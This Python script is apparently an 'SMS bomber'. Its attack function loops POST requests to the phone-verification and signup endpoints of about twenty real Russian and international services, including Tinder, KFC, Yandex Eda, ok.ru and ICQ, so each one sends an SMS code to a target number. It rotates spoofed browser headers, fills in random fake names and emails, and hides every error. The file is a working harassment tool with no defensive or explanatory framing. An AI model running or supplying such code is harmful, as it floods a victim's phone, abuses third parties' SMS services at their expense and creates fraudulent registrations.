import random
import requests
import random
import string


heads = [{'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
          'Accept': '*/*'},
         {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
          'Accept': '*/*'},
         {"User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
          'Accept': '*/*'},
         {'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
          'Accept': '*/*'},
         {"User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
          'Accept': '*/*'},
         ]


def check(sent, sms):
    if sent == sms:
        return True


def attack(number, sms):
    number_7 = str(7) + number
    number_plus7 = '+7' + number
    number_8 = str(8) + number
    name = ''.join(random.choice(string.ascii_letters)
                   for _ in range(6))
    sent = 0
    HEADERS = random.choice(heads)
    while sent <= int(sms):
        try:
            requests.post(
                'https://api.sunlight.net/v3/customers/authorization/',
                data={
                    'phone': number_7},
                headers=HEADERS)
            sent += 1

            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post(
                "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                json={
                    "phone": number_7},
                headers=HEADERS)
            sent += 1

            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post(
                'https://cloud.mail.ru/api/v2/notify/applink',
                json={
                    "phone": number_plus7,
                    "api": 2,
                    "email": "email",
                    "x-email": "x-email"},
                headers=HEADERS)
            sent += 1

            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post(
                'https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
                json={
                    'phone': number_plus7},
                headers=HEADERS)
            sent += 1

            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post(
                'https://b.utair.ru/api/v1/login/',
                data={
                    'login': number_8},
                headers=HEADERS)
            sent += 1

            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post(
                'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                data={
                    "phone_number": number_7},
                headers=HEADERS)
            sent += 1

            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post(
                'https://www.citilink.ru/registration/confirm/phone/+' +
                number_7 +
                '/',
                headers=HEADERS)
            sent += 1

            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post(
                "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                data={
                    "st.r.phone": number_plus7},
                headers=HEADERS)
            sent += 1

            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/',
                          data={"phone": number_7}, headers=HEADERS)
            sent += 1

            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post(
                'https://youdrive.today/login/web/phone',
                data={
                    'phone': number,
                    'phone_code': '7'},
                headers=HEADERS)  # headers = {}, headers=HEADERS)
            sent += 1

            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post(
                'https://api.mtstv.ru/v1/users',
                json={
                    'msisdn': number_7},
                headers=HEADERS)
            sent += 1

            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post(
                'https://youla.ru/web-api/auth/request_code',
                json={
                    "phone": number_plus7},
                headers=HEADERS)
            sent += 1

            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post(
                'https://eda.yandex/api/v1/user/request_authentication_code',
                json={
                    "phone_number": "+" +
                    number_7},
                headers=HEADERS)
            sent += 1

            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post(
                "https://api.ivi.ru/mobileapi/user/register/phone/v6",
                data={
                    "phone": number_7},
                headers=HEADERS)
            sent += 1

            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post(
                "https://api.delitime.ru/api/v2/signup",
                data={
                    "SignupForm[username]": number_7,
                    "SignupForm[device_type]": 3},
                headers=HEADERS)
            sent += 1

            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post(
                'https://www.icq.com/smsreg/requestPhoneValidation.php',
                data={
                    'msisdn': number_7,
                    "locale": 'en',
                    'countryCode': 'ru',
                    'version': '1',
                    "k": "ic1rtwz1s1Hj1O0r",
                    "r": "46763"},
                headers=HEADERS)
            sent += 1

            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post(
                'http://www.aramba.ru/core.php',
                data={
                    'act': 'codeRequest',
                    'phone': number_plus7,
                    'l': name,
                    'p': name,
                    'name': name,
                    'email': name + '@gmail.com'},
                headers=HEADERS)
            sent += 1
            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post('https://belkacar.ru/get-confirmation-code',
                          data={'phone': number_7}, headers=HEADERS)
            sent += 1
            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.get(
                'https://online.denga.ru/admin/api/json/registration',
                data={
                    'phone': number_7,
                    'email': name + '@gmail.com',
                    'password': '12345678',
                    'passwordConfirmation': '12345678'},
                headers=HEADERS)
            sent += 1
            if check(sent, sms):
                break
        except BaseException:
            pass

        try:
            requests.post(
                'https://online-api.dozarplati.com/rpc',
                json={
                    'id': 1,
                    'jsonrpc': '2.0',
                    'method': 'auth.login',
                    'params': {
                        'phoneNumber': number_7}},
                headers=HEADERS)
            sent += 1
            if check(sent, sms):
                break
        except BaseException:
            pass
